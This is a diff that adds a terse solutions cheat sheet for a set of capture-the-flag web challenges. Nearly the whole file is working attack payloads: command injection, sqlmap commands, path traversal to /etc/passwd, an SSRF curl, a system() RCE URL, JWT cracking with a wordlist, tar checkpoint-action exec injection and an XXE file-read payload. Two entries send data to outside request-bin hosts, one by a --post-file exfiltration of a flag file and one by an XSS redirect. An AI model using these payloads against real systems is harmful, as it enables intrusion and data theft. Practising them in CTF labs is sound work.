@@ -1,0 +1,62 @@
+ping station
+1.1.1.1; cat flag
+
+small data leak
+1./user?id=1
+2.sqlmap -u link --dbs
+3.sqlmap -u link -D public --tables
+
+file-crawler------Local File Inclusion Vulnerability (LFI)
+1./local?image_name=..//..//..//etc/passwd
+2./local?image_name=..////tmp/flag
+
+alien inclusion------------Server-side request forgery vulnerability
+1. curl 'http://35.198.135.192:30796/?start=' --data 'start=flag.php'
+
+substitute - (RCE)
+1./index.php?vector=/Admin/e&replace=system(%27cat%20here_we_dont_have_flag/flag.txt%27)
+
+under construction
+1.register
+2. f12 role_admin
+3.local storage change
+4.jwt_tool.py -t http://35.198.93.134:30791/api/app/admin -rc "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIsImlhdCI6MTYzNTkzNjY4OCwiZHhwIjoxNjM2MDIzMDg4fQ.tQ2KlBU8tI5V1Akiqhwy2LSEOF9oBTvnYFs_xgwro04" -C -d rockyou.txt
+
+downloader v1
+1.public.requestbin.com
+2.https://ens272cgdd3.x.pipedream.net/  --post-file '/var/www/html/flag.php'
+
+manual-review (CSS)
+1.register
+2.<script>window.location.href="https://en5ozgvbee1ld.x.pipedream.net/hello";</script>
+
+tartarsausage (XXE)
+1. f12 elements
+2.cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec="ls -la"
+3. cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec="cat enhjenhzZGN3YWRzYWRhc2Rhc3NhY2FzY2FzY2FzY2FjYWNzZHNhY2FzY2Fzc2FjY2Fz/flag"
+
+syntax-check (XXE)
+1. burp
+2.<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY>
+<!ENTITY xxe SYSTEM
+6
+"php://filter/convert.base64-encode/resource=/var/www/html/flag">
+]>
+<foo>
+&xxe;
+</foo>
+
+ultra-crawl (LFI)
+1. burp
+2. search: file:///etc/passwd
+3. host- company.tld
+   url=file:///home/ctf/app.py
+
+alfa-cookie
+1. burp cookie,key
+2.
+
+
+
